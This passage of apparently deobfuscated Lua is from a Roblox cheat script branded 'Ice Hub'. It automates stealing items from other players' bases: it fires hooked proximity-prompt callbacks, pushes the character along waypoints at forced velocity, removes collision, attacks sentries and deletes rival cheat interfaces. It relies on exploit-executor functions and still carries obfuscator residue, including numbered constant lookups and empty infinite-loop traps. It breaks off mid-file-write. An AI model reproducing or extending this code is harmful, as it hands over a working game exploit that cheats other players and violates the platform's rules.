											semitp = tbl18.semitp
											semitp.selectedSlot = tonumber(semitp.selectedSlot) or 1

											if semitp.selectedSlot ~= 1 and semitp.selectedSlot ~= 2 then
												semitp.selectedSlot = 1
											end

											selectedSlot = semitp.selectedSlot

											do
												local tbl20 = {
													"Flying Carpet",
													"FlyingCarpet",
													"WitchBroom",
													"Witch'sBroom",
													"Witch's Broom",
													"CupidWings",
													"Cupid'sWings",
													"Cupid's Wings",
													"SantaSleigh",
													"Santa'sSleigh",
													"Santa's Sleigh",
													"Waverider",
												}

												local function fn58(arg, arg2)
													if not arg then
														return nil
													end

													if not (v82[199] >= n24) then
														local v86 = arg:FindFirstChild(arg2)

														if v86 and v86:IsA("Tool") then
															if not flag2 then
																return
															end
															return v86
														end

														local str8 = arg2:lower():gsub("[%s'%_%-]", "")

														for _, child in ipairs(arg:GetChildren()) do
															if child:IsA("Tool") then
																if child.Name:lower():gsub("[%s'%_%-]", "") == str8 then
																	return child
																end
															end
														end

														return nil
													end

													while true do
													end
												end

												local function fn59(arg)
													local character = localPlayer.Character
													if not character then
														return nil
													end
													local backpack = localPlayer:FindFirstChild("Backpack")
													local v86 = fn58(character, arg)
													if v86 then
														return v86
													end
													local v87 = fn58(backpack, arg)

													if v87 then
														local v88 = character:FindFirstChildOfClass(v82[95])

														if n24 > 9624 then
															while v82[76] do
															end
														end

														if v88 then
															v88:EquipTool(v87)
														end

														return v87
													end

													return nil
												end

												fn51 = function()
													for _, v86 in ipairs(tbl20) do
														local v87 = fn59(v86)
														if v87 then
															return v87
														end
													end

													return nil
												end
											end
										end

										do
											v85 = nil

											fn52 = function(arg)
												if not arg then
													return nil
												end
												local plotSign = arg:FindFirstChild("PlotSign")
												plotSign = plotSign and plotSign:FindFirstChild("SurfaceGui")
												plotSign = plotSign and plotSign:FindFirstChild("Frame")
												plotSign = plotSign and plotSign:FindFirstChild("TextLabel")
												if not plotSign then
													return nil
												end
												local str8 = tostring(plotSign.Text):gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
												if str8 == "" or str8 == v82[14] then
													return nil
												end

												for _, player in ipairs(Players:GetPlayers()) do
													if player.Name == str8 or player.DisplayName == str8 then
														return player
													end
												end

												return nil
											end

											fn53 = function()
												if semitp.autoPotion then
													local character = localPlayer.Character
													local backpack = localPlayer:FindFirstChild("Backpack")
													local giantPotion = backpack and backpack:FindFirstChild("Giant Potion") or character and character:FindFirstChild("Giant Potion")

													if giantPotion and character then
														local humanoid = character:FindFirstChildOfClass("Humanoid")

														if humanoid then
															humanoid:EquipTool(giantPotion)
														end

														pcall(function()
															giantPotion:Activate()
														end)
													end
												end

												if semitp.autoAdminSpam then
													task.spawn(function()
														local flag18 = v85 and v85.Parent == Players and v85 or getNearestEnemy()

														if flag18 then
															fn33(flag18)
														end
													end)
												end
											end

											do
												local obj = setmetatable({}, { __mode = "k" })

												local function fn58(arg)
													if type(getconnections) ~= "function" then
														return nil
													end

													if not obj[arg] then
														local tbl20 = { hold = {}, trigger = {} }
														local ok, result = pcall(getconnections, arg.PromptButtonHoldBegan)

														if ok then
															local v86 = v82[29]
															ok = type(result) == v86
														end

														if ok then
															for _, v86 in ipairs(result) do
																if type(v86.Function) == "function" then
																	table.insert(tbl20.hold, v86.Function)
																end
															end
														end

														local ok2, result2 = pcall(getconnections, arg.Triggered)

														if ok2 then
															local v86 = v82[29]
															ok2 = type(result2) == v86
														end

														if ok2 then
															for _, v86 in ipairs(result2) do
																if type(v86.Function) == "function" then
																	table.insert(tbl20.trigger, v86.Function)
																end
															end
														end

														if #tbl20.hold == 0 and #tbl20.trigger == 0 then
															if not flag3 then
																return
															end
															return nil
														end

														obj[arg] = tbl20
														return tbl20
													end

													if not (n25 <= 3913) then
														return obj[arg]
													end

													while true do
													end
												end

												fn54 = function(arg)
													if not arg or not arg.Parent then
														return nil
													end
													local v86 = fn58(arg)
													if not v86 then
														return nil
													end

													for _, v87 in ipairs(v86.hold) do
														task.spawn(v87)
													end

													local now2 = tick()
													return { prompt = arg, cb = v86, startedAt = now2, holdBeganAt = now2 }
												end
											end
										end

										fn55 = function(arg, arg2)
											if not arg then
												return
											end
											local n35 = tick() - (arg.startedAt or tick())

											if n35 < arg2 then
												task.wait(arg2 - n35)
											end
										end

										fn56 = function(arg)
											if not arg then
												return v82[120]
											end
											local n35 = tick() - (arg.holdBeganAt or tick())

											if n35 < v82[131] then
												task.wait(v82[131] - n35)
											end

											task.wait(0.02)

											for _, v86 in ipairs(arg.cb.trigger) do
												task.spawn(v86)
											end

											return true
										end

										tbl19 = {
											b1 = {
												refVec = Vector3.new(-v82[146], -5, 100),
												finalPos = Vector3.new(-337, -5, 103),
											},
											b2 = {
												refVec = Vector3.new(-335, -5, 20),
												finalPos = Vector3.new(-334.8, -5.04, 18.9),
											},
										}

										do
											local tbl20 = {
												b1 = Vector3.new(-v82[126], -v82[50], 115.08060455),
												b2 = Vector3.new(-347.88534546, -6.90106964, 6.18073416),
											}

											local thread = nil
											local n35 = 0

											fn39 = function()
												n35 += v82[118]

												if thread then
													pcall(function()
														task.cancel(thread)
													end)

													thread = nil
												end

												local character = localPlayer.Character
												local humanoid = character and character:FindFirstChildOfClass("Humanoid")

												if humanoid then
													pcall(function()
														humanoid:Move(Vector3.zero, false)
													end)
												end
											end

											fn57 = function(arg)
												if not semitp.autoWalk then
													return
												end
												fn39()
												local v86 = n35

												thread = task.spawn(function()
													local now2 = tick()

													while true do
														if semitp.autoWalk and v86 == n35 and tick() - now2 < 3 then
															if not localPlayer:GetAttribute("Stealing") then
																task.wait(0.03)
																continue
															end
														end

														break
													end

													if not semitp.autoWalk or v86 ~= n35 then
														return
													end

													if not localPlayer:GetAttribute("Stealing") then
														return
													end
													local b2 = arg and tbl20.b2 or tbl20.b1
													local now3 = tick()
													local n36 = 0

													while true do
														if semitp.autoWalk and v86 == n35 and tick() - now3 < 20 then
															local character = localPlayer.Character
															local v87 = character and character:FindFirstChildOfClass(v82[95])
															character = character and character:FindFirstChild("HumanoidRootPart")

															if not (not v87 or not character or v87.Health <= 0) then
																local vector = Vector3.new(b2.X, character.Position.Y, b2.Z)
																local v88 = v82[28]

																if not ((Vector3.new(character.Position.X, character.Position.Y, character.Position.Z) - vector).Magnitude <= v88) then
																	if v82[1] <= tick() - n36 then
																		n36 = tick()

																		pcall(function()
																			v87:MoveTo(b2)
																		end)
																	end

																	if not (not localPlayer:GetAttribute("Stealing") and tick() - now3 > 0.35) then
																		RunService.Heartbeat:Wait()
																		continue
																	end
																end
															end
														end

														break
													end

													local character = localPlayer.Character
													local humanoid = character and character:FindFirstChildOfClass("Humanoid")

													if humanoid and v86 == n35 then
														pcall(function()
															humanoid:Move(Vector3.zero, v82[120])
														end)
													end

													if v86 == n35 then
														thread = nil
													end
												end)
											end
										end
									end

									local tbl20

									do
										tbl20 = { podSlots = { "2", v82[37] } }

										do
											local b1 = {}
											local waypoints = {}
											local vector = Vector3.new(-v82[156], -6.4328260421752903, v82[110])
											local vector2 = Vector3.new(-352.96304321289062, -v82[168], v82[197])
											local vector3 = Vector3.new
											waypoints[1] = vector
											waypoints[2] = vector2

											do
												local values = table.pack(vector3(-326.0740966796875, -4.3732538223266602, 101.64852142333984))
												table.move(values, 1, values.n, 3, waypoints)
											end

											b1.waypoints = waypoints
											b1.greenPos = Vector3.new(-352.76815795898438, -6.5221853256225604, 91.016448974609375)
											tbl20.b1 = b1
										end
									end

									do
										local b2 = {}
										local waypoints = {}
										local vector = Vector3.new(-352.76190185546875, -v82[170], 114.06043243408203)
										local vector2 = Vector3.new(-352.15, -v82[161], 28.59)
										local vector3 = Vector3.new
										waypoints[1] = vector
										waypoints[2] = vector2

										do
											local values = table.pack(vector3(-323.26, -4.82, 19.17))
											table.move(values, 1, values.n, 3, waypoints)
										end

										b2.waypoints = waypoints
										b2.greenPos = Vector3.new(-352.15, -7.03, 28.59)
										tbl20.b2 = b2
									end

									do
										local function fn58(arg, arg2)
											if not arg or not arg2 then
												return false
											end
											local position = arg.Position
											local filterDescendantsInstances = { localPlayer.Character }

											for i = v82[118], 12 do
												local n35 = arg2 - position
												if n35.Magnitude <= 0.05 then
													return v82[76]
												end
												local raycastParams = RaycastParams.new()
												raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
												raycastParams.FilterDescendantsInstances = filterDescendantsInstances
												raycastParams.IgnoreWater = true
												local hit = service3:Raycast(position, n35, raycastParams)
												if not hit then
													return true
												end
												local instance2 = hit.Instance
												if not instance2 then
													return v82[76]
												end

												if instance2:IsA(v82[70]) and not instance2.CanCollide then
													table.insert(filterDescendantsInstances, instance2)
													position = hit.Position + n35.Unit * 0.1
													continue
												end

												return (hit.Position - arg2).Magnitude <= 3
											end

											return false
										end

										local function fn59(arg, arg2, arg3, arg4)
											if not arg or not arg.Parent or not arg2 then
												return
											end
											arg3 = arg3 or 180
											arg4 = arg4 or 3
											local controls = nil

											pcall(function()
												controls = require(localPlayer.PlayerScripts:WaitForChild("PlayerModule", 2)):GetControls()
											end)

											if controls then
												pcall(function()
													controls:Disable()
												end)
											end

											local now2 = tick()

											while true do
												if arg and arg.Parent then
													local position = arg.Position
													local n35 = arg2 - Vector3.new(position.X, arg2.Y, position.Z)

													if not (n35.Magnitude <= arg4 or tick() - now2 > 6) then
														fn51()
														local n36 = n35.Unit * arg3
														arg.AssemblyLinearVelocity = Vector3.new(n36.X, arg.AssemblyLinearVelocity.Y, n36.Z)
														RunService.Heartbeat:Wait()
														continue
													end
												end

												break
											end

											if arg and arg.Parent then
												arg.AssemblyLinearVelocity = Vector3.zero
												if not flag3 then
													return
												end
											end

											if controls then
												pcall(function()
													controls:Enable()
												end)
											end
										end

										fn40 = function(arg)
											if not arg or not arg:IsA(v82[183]) then
												return false
											end
											local surfaceGui = arg:FindFirstChild(v82[6])
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("SurfaceGui")
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("Frame")
											surfaceGui = surfaceGui and surfaceGui:FindFirstChild("TextLabel")
											if not surfaceGui or surfaceGui.Text == "Empty Base" then
												return false
											end
											local str8 = surfaceGui.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
											return str8 ~= localPlayer.Name and str8 ~= localPlayer.DisplayName
										end

										local function fn60(arg, arg2)
											local plots = service3:FindFirstChild("Plots")
											if not plots then
												return nil
											end
											local huge = math.huge
											local tbl21 = nil

											for _, child in ipairs(plots:GetChildren()) do
												if fn40(child) then
													local v86 = child:FindFirstChild(v82[38])

													if v86 then
														local position = nil

														pcall(function()
															position = child.PrimaryPart and child.PrimaryPart.Position or child:GetPivot().Position
														end)

														if not position then
															local basePart = child:FindFirstChildWhichIsA("BasePart", true)

															if basePart then
																position = basePart.Position
															end
														end

														local flag18 = true

														if position then
															flag18 = (position - tbl19.b1.refVec).Magnitude < (position - tbl19.b2.refVec).Magnitude
														end

														for _, v87 in ipairs(arg2) do
															local v88 = v86:FindFirstChild(v87)
															local main = v88 and v88:FindFirstChild(v82[71]) and v88.Claim:FindFirstChild("Main")

															if main then
																local magnitude = (arg.Position - main.Position).Magnitude
																local promptAttachment = v88:FindFirstChild(v82[194]) and v88.Base:FindFirstChild(v82[122])
																promptAttachment = promptAttachment and promptAttachment:FindFirstChild("PromptAttachment")
																local proximityPrompt = promptAttachment and promptAttachment:FindFirstChildWhichIsA("ProximityPrompt")

																if proximityPrompt and magnitude < huge then
																	tbl21 = {
																		plot = child,
																		podiumName = v87,
																		position = main.Position,
																		prompt = proximityPrompt,
																		isEnemyBase1 = flag18,
																	}

																	huge = magnitude
																end
															end
														end
													end
												end
											end

											return tbl21
										end

										halfwaySteal = {
											debounce = false,
											setSlot = function(arg)
												local selectedSlot2 = tonumber(arg)

												if selectedSlot2 == 1 or selectedSlot2 == 2 then
													selectedSlot = selectedSlot2
													semitp.selectedSlot = selectedSlot2
													tbl18.semitp.selectedSlot = selectedSlot2
													fn36()
												end
											end,
											SSDoTeleport = function()
												local character = localPlayer.Character
												local humanoid = character and character:FindFirstChildOfClass("Humanoid")
												character = character and character:FindFirstChild("HumanoidRootPart")
												if not humanoid or not character then
													return
												end
												fn50()
												fn51()
												local v86 = fn60(character, selectedSlot == 2 and tbl20.podSlots or { "1", v82[159] })
												if not v86 then
													return
												end
												v85 = fn52(v86.plot)
												local isEnemyBase1 = v86.isEnemyBase1
												local waypoints, greenPos

												if selectedSlot == 2 then
													local b1 = isEnemyBase1 and tbl20.b1 or tbl20.b2

													if n24 < 9593 then
														while true do
														end
													else
														waypoints = b1.waypoints
														greenPos = b1.greenPos
													end
												else
													if isEnemyBase1 then
														waypoints = {}
														local vector = Vector3.new(-352.51531982421875, -v82[52], 6.8918328285217303)
														local vector2 = Vector3.new
														local n35 = -v82[121]
														local vector3 = Vector3.new(-353.11746215820312, -6.4626121520996103, 113.28694152832031)
														waypoints[1] = vector
														waypoints[2] = vector3

														do
															local values = table.pack(vector2(n35, -4.6232452392578098, 100.70635986328125))
															table.move(values, 1, values.n, 3, waypoints)
														end
													else
														waypoints = isEnemyBase1
													end

													if not waypoints then
														waypoints = {}
														local vector = Vector3.new(-352.7619, -6.3828, 114.0604)
														local vector2 = Vector3.new(-351.49, -6.38, v82[102])
														local vector3 = Vector3.new
														local v87 = v82[30]
														waypoints[1] = vector
														waypoints[2] = vector2

														do
															local values = table.pack(vector3(-334.8, -5.04, v87))
															table.move(values, 1, values.n, 3, waypoints)
														end
													end

													greenPos = isEnemyBase1 and Vector3.new(-349.87167358398438, -6.5221853256225604, 82.971054077148438) or Vector3.new(-349.42999267578125, -v82[44], 37.470001220703118)
												end

												local parent = v86.prompt and v86.prompt.Parent
												local v87 = nil

												if parent then
													v86.prompt.RequiresLineOfSight = false
													v86.prompt.MaxActivationDistance = math.huge
													v87 = fn54(v86.prompt)

													if not v87 and fireproximityprompt then
														task.spawn(function()
															fireproximityprompt(v86.prompt)
														end)
													end
												end

												if v87 then
													fn55(v87, 0.8)
												end

												local v88 = v82[118]

												for i = #waypoints, 1, -1 do
													if fn58(character, waypoints[i]) then
														v88 = i
														break
													end
												end

												for i = v88, #waypoints do
													fn59(character, waypoints[i], 180, 3)
												end

												task.wait(v82[18])
												fn53()
												fn51()

												if v86.prompt and v86.prompt.Parent then
													if greenPos then
														if v87 then
															fn55(v87, v82[131])
														end

														character.CFrame = CFrame.new(greenPos)
													end

													if v87 then
														fn56(v87)
														if not flag2 then
															return
														end
													end
												end

												if semitp.autoWalk then
													fn57(isEnemyBase1)
												end

												task.delay(v82[118], function()
													v85 = nil
												end)
											end,
											execute = function()
												if localPlayer:GetAttribute("Stealing") then
													return
												end

												if halfwaySteal.debounce then
													return
												end
												halfwaySteal.debounce = v82[76]

												task.spawn(function()
													local ok = pcall(function()
														fn50()
														halfwaySteal.SSDoTeleport()
													end)

													task.wait(0.15)
													halfwaySteal.debounce = false

													if not ok then
														tbl17.stealBusy = false
													end

													if semitp.autoRetrySteal then
														task.delay(0.8, function()
															if semitp.autoRetrySteal and not localPlayer:GetAttribute("Stealing") and not halfwaySteal.debounce then
																halfwaySteal.execute()
															end
														end)
													end
												end)
											end,
										}
									end
								end
							end

							do
								local fn50, r, flag18, flag19, n35, n36, instance2, frame2

								do
									do
										local flag20, thread, flag21, cFrame, fn51, fn52

										do
											fn41 = function()
												halfwaySteal.execute()
											end

											_G.HalfwaySteal = halfwaySteal

											_G.SSExecute = function()
												pcall(halfwaySteal.execute)
											end

											_G.SetSlot = function(arg)
												halfwaySteal.setSlot(arg)
											end

											semitp.speedBoost = v82[120]
											tbl18.semitp.speedBoost = false
											flag20 = v82[120]
											thread = nil
											flag21 = v82[120]

											do
												local flag22 = v82[120]
												cFrame = nil
												local connection = nil

												fn51 = function()
													flag22 = false

													if connection then
														connection:Disconnect()
														connection = nil
													end
												end

												fn52 = function()
													if connection then
														return
													end
													flag22 = true

													connection = RunService.RenderStepped:Connect(function()
														if flag22 and cFrame and service3.CurrentCamera then
															service3.CurrentCamera.CFrame = cFrame
														end
													end)
												end
											end
										end

										do
											local function fn53()
												flag21 = true

												if thread then
													pcall(function()
														task.cancel(thread)
													end)

													thread = nil
												end

												flag20 = false
												fn51()
												local character = localPlayer.Character
												local humanoid = character and character:FindFirstChildOfClass("Humanoid")

												if humanoid then
													pcall(function()
														humanoid.HipHeight = 2
														local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

														if humanoidRootPart then
															humanoidRootPart.CanCollide = true
														end

														for _, child in ipairs(character:GetChildren()) do
															if child:IsA("BasePart") and child.Name ~= "HumanoidRootPart" then
																child.CanCollide = true
															end
														end
													end)
												end
											end

											fn50 = function()
												if flag20 then
													return
												end
												flag20 = true
												flag21 = false
												local character = localPlayer.Character

												if not character then
													flag20 = v82[120]
													if not flag3 then
														return
													end
													return
												end

												local humanoid = character:FindFirstChildOfClass("Humanoid")
												if not humanoid then
													flag20 = v82[120]
													return
												end
												local currentCamera = service3.CurrentCamera

												if currentCamera then
													cFrame = currentCamera.CFrame
													fn52()
												end

												thread = task.spawn(function()
													local hipHeight = humanoid.HipHeight
													local flag22 = v82[120]
													local n37 = 0

													while true do
														if character.Parent and humanoid.Parent and humanoid.Health > 0 and localPlayer.Character == character and not flag21 then
															pcall(function()
																humanoid.HipHeight = 1e30
																humanoid.AutoRotate = true
																local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

																if humanoidRootPart then
																	humanoidRootPart.CanCollide = false
																end

																for _, child in ipairs(character:GetChildren()) do
																	if child:IsA("BasePart") and child.Name ~= "HumanoidRootPart" then
																		child.CanCollide = false
																	end
																end
															end)

															n37 += 1
															if not (n37 >= 40) then
																task.wait(0.05)
																continue
															end
														end

														break
													end

													if localPlayer.Character ~= character or not character.Parent or humanoid.Health <= 0 then
														flag22 = v82[76]
													end

													if not flag22 and character.Parent and humanoid.Parent and humanoid.Health > v82[46] and not flag21 then
														pcall(function()
															humanoid.Health = v82[46]
														end)

														task.wait(0.1)
														flag22 = not character.Parent or humanoid.Health <= 0 or localPlayer.Character ~= character
													end

													if not flag22 and character.Parent and humanoid.Parent then
														pcall(function()
															humanoid.HipHeight = hipHeight
															local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

															if humanoidRootPart then
																humanoidRootPart.CanCollide = true
															end

															for _, child in ipairs(character:GetChildren()) do
																if child:IsA(v82[70]) and child.Name ~= "HumanoidRootPart" then
																	child.CanCollide = true
																end
															end
														end)
													end

													fn51()
													flag20 = false
													thread = nil
													flag21 = false
												end)
											end

											localPlayer.CharacterAdded:Connect(function()
												fn53()
												flag21 = false
											end)
										end
									end

									do
										do
											do
												local function fn51(arg)
													if not tbl17.AutoResetBalloonEnabled then
														return
													end
													local v85 = v82[72]
													if typeof(arg) ~= v85 then
														return
													end

													if not string.lower(arg):find("ran \"balloon\" on you!") then
														return
													end
													fn50()
												end

												local function fn52(arg)
													for _, descendant in ipairs(arg:GetDescendants()) do
														if descendant:IsA("TextLabel") or descendant:IsA(v82[139]) or descendant:IsA(v82[174]) then
															fn51(descendant.Text)

															pcall(function()
																table.insert(tbl17.balloonGuiConnections, descendant:GetPropertyChangedSignal("Text"):Connect(function()
																	fn51(descendant.Text)
																end))
															end)
														end
													end
												end

												local function fn53(arg)
													if n26(4115) < 16481 then
														pcall(function()
															if n26(4561) > 18212 then
																table.insert(tbl17.balloonGuiConnections, arg.DescendantAdded:Connect(function(descendant)
																	if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
																		fn51(descendant.Text)

																		table.insert(tbl17.balloonGuiConnections, descendant:GetPropertyChangedSignal("Text"):Connect(function()
																			fn51(descendant.Text)
																		end))
																	end
																end))

																return
															end

															while true do
															end
														end)
													else
														while v82[76] do
														end
													end
												end

												fn42 = function()
													for _, balloonGuiConnection in ipairs(tbl17.balloonGuiConnections) do
														pcall(function()
															balloonGuiConnection:Disconnect()
														end)
													end

													tbl17.balloonGuiConnections = {}

													if tbl17.balloonChildAddedConn then
														pcall(function()
															tbl17.balloonChildAddedConn:Disconnect()
														end)
													end

													pcall(function()
														local playerGui2 = localPlayer:WaitForChild("PlayerGui")

														for _, child in ipairs(playerGui2:GetChildren()) do
															fn52(child)
															fn53(child)
														end

														tbl17.balloonChildAddedConn = playerGui2.ChildAdded:Connect(function(child)
															fn53(child)
															fn52(child)
														end)
													end)
												end
											end
										end

										do
											fn43 = function()
												for _, balloonGuiConnection in ipairs(tbl17.balloonGuiConnections) do
													pcall(function()
														balloonGuiConnection:Disconnect()
													end)
												end

												tbl17.balloonGuiConnections = {}

												if tbl17.balloonChildAddedConn then
													pcall(function()
														tbl17.balloonChildAddedConn:Disconnect()
													end)

													tbl17.balloonChildAddedConn = nil
												end
											end

											fn44 = function()
												if tbl17.sentryConn then
													tbl17.sentryConn:Disconnect()
												end

												tbl17.sentrySeen = setmetatable({}, { __mode = "k" })

												tbl17.sentryConn = service3.DescendantAdded:Connect(function(descendant)
													if not tbl17.sentryEnabled then
														return
													end

													if not descendant:IsA("Model") and not descendant:IsA("BasePart") then
														return
													end
													local v85 = descendant

													if not string.find((v85.Name or ""):lower(), "sentry", 1, true) and descendant:IsA(v82[70]) then
														local model = descendant:FindFirstAncestorOfClass("Model")
														local v86

														if model then
															v86 = string.find((model.Name or ""):lower(), "sentry", 1, true)
														else
															v86 = model
														end

														if v86 then
															v85 = model
														end
													end

													local find = string.find
													local name = v85.Name or ""
													local v86 = v82[118]
													if not find(name:lower(), "sentry", v86, true) then
														return
													end

													if tbl17.sentrySeen[v85] then
														return
													end
													tbl17.sentrySeen[v85] = v82[76]

													for _, player in pairs(Players:GetPlayers()) do
														if player.Character and v85:IsDescendantOf(player.Character) and player == localPlayer then
															return
														end
													end

													task.delay(4.1, function()
														if not v85.Parent or not tbl17.sentryEnabled then
															return
														end
														local character = localPlayer.Character
														local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
														if not character or not humanoidRootPart then
															return
														end
														local backpack = localPlayer:FindFirstChild("Backpack")
														local bat = backpack and backpack:FindFirstChild("Bat") or character:FindFirstChild("Bat")
														if not bat then
															return
														end
														local v87 = character:FindFirstChildOfClass(v82[95])

														if bat.Parent == backpack and v87 then
															v87:EquipTool(bat)
															task.wait(0.12)
														end

														local n37 = humanoidRootPart.CFrame.LookVector * 3.5 + Vector3.new(0, 1.2, 0)

														pcall(function()
															if v85:IsA("Model") and v85.PrimaryPart then
																v85:SetPrimaryPartCFrame(humanoidRootPart.CFrame + n37)
															elseif v85:IsA(v82[70]) then
																v85.CFrame = humanoidRootPart.CFrame + n37
															end
														end)

														if bat.Parent == character then
															bat:Activate()
														end

														for i = 1, 5 do
															if not (not tbl17.sentryEnabled or not v85.Parent) then
																task.wait(0.12)

																if v85.Parent then
																	bat:Activate()
																end

																continue
															end

															break
														end

														if bat.Parent == character and backpack then
															bat.Parent = backpack
														end
													end)
												end)
											end

											fn45 = function()
												if tbl17.sentryConn then
													tbl17.sentryConn:Disconnect()
													tbl17.sentryConn = nil
												end

												tbl17.sentrySeen = nil
											end

											fn46 = function()
												tbl17.gameStretcherEnabled = v82[76]
												tbl18.toggles.gameStretcher = true
												fn36()

												if tbl17.gameStretcherConn then
													tbl17.gameStretcherConn:Disconnect()
												end

												pcall(function()
													tbl17.gameStretcherConn = RunService.RenderStepped:Connect(function()
														if not tbl17.gameStretcherEnabled then
															return
														end
														local currentCamera = service3.CurrentCamera

														if currentCamera then
															currentCamera.FieldOfView = 100
														end
													end)
												end)
											end

											fn47 = function()
												tbl17.gameStretcherEnabled = v82[120]
												tbl18.toggles.gameStretcher = false
												fn36()

												if tbl17.gameStretcherConn then
													tbl17.gameStretcherConn:Disconnect()
													tbl17.gameStretcherConn = nil
												end

												local currentCamera = service3.CurrentCamera

												if currentCamera then
													if tbl18.toggles.customFOV then
														currentCamera.FieldOfView = 120
													elseif tbl18.toggles.antiBee then
														currentCamera.FieldOfView = 70
													else
														currentCamera.FieldOfView = 70
													end
												end
											end

											do
												local function fn51(arg)
													local plots = service3.Plots and service3.Plots:FindFirstChild(arg)
													if not plots then
														return false
													end
													local v85 = plots:FindFirstChild(v82[6])
													if not v85 then
														return false
													end
													local yourBase = v85:FindFirstChild("YourBase")
													return yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled == true
												end

												fn49 = function(arg)
													local v85 = getHRP()
													if not v85 then
														return
													end
													local plots = service3:FindFirstChild("Plots")
													if not plots then
														return
													end
													local huge = math.huge
													local v86 = nil

													for _, child in pairs(plots:GetChildren()) do
														if child:IsA("Model") and not fn51(child.Name) then
															local magnitude = (v85.Position - (child.PrimaryPart and child.PrimaryPart.Position or child:GetPivot().Position)).Magnitude

															if magnitude < huge then
																huge = magnitude
																v86 = child
															end
														end
													end

													if v86 and v86:FindFirstChild(v82[66]) then
														local tbl20 = {}

														for _, child in pairs(v86.Unlock:GetChildren()) do
															table.insert(tbl20, { Obj = child, Y = (child:IsA("Model") and child:GetPivot().Position or child.Position).Y })
														end

														table.sort(tbl20, function(arg2, arg3)
															return arg2.Y < arg3.Y
														end)

														if tbl20[arg] then
															for _, descendant in pairs(tbl20[arg].Obj:GetDescendants()) do
																if descendant:IsA("ProximityPrompt") then
																	pcall(function()
																		fireproximityprompt(descendant)
																	end)
																end
															end
														end
													end
												end
											end
										end

										do
											local function fn51()
												local tbl20 = { CoreGui, playerGui }

												pcall(function()
													if gethui then
														local hui = gethui()

														if hui then
															table.insert(tbl20, hui)
														end
													end

													if not (n25 <= 3902) then
														return
													end

													while true do
													end
												end)

												for _, v85 in ipairs(tbl20) do
													if v85 then
														for _, child in ipairs(v85:GetChildren()) do
															if child:IsA(v82[84]) then
																local flag20 = child:GetAttribute("IceHubOwned") == true or child.Name == "ICE_HUB_MAIN_GUI" or child.Name == "ICE_HUB_SEMITP_GUI"

																if not flag20 then
																	pcall(function()
																		for _, descendant in ipairs(child:GetDescendants()) do
																			if (descendant:IsA("TextLabel") or descendant:IsA("TextButton")) and (descendant.Text == "Ice Hub - By Aeroz hub lol" or descendant.Text == "https://discord.gg/ZusW3VnQCf") then
																				flag20 = v82[76]
																				break
																			end
																		end
																	end)
																end

																if flag20 then
																	pcall(function()
																		child:Destroy()
																	end)
																end
															end
														end
													end
												end
											end

											fn51()
										end
									end

									do
										do
											do
												local function fn51(arg)
													return (arg:gsub("[^ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=]", ""):gsub(".", function(arg2)
														if arg2 == "=" then
															return ""
														end
														local n37 = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):find(arg2, 1, v82[76]) - 1
														local str8 = ""

														for i = 6, v82[118], -1 do
															str8 ..= n37 % 2 ^ i - n37 % 2 ^ (i - 1) > 0 and v82[20] or "0"
														end

														return str8
													end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(arg2)
														if #arg2 ~= 8 then
															return ""
														end
														local n37 = 0

														for i = v82[118], 8 do
															local v85 = v82[20]
															n37 += arg2:sub(i, i) == v85 and 2 ^ (8 - i) or 0
														end

														return string.char(n37)
													end))
												end

												local function fn52()
													local png = nil

													pcall(function()
														if writefile and getcustomasset then
															if not (isfile and isfile("icehub_logo.png")) then
																writefile("icehub_logo.png", 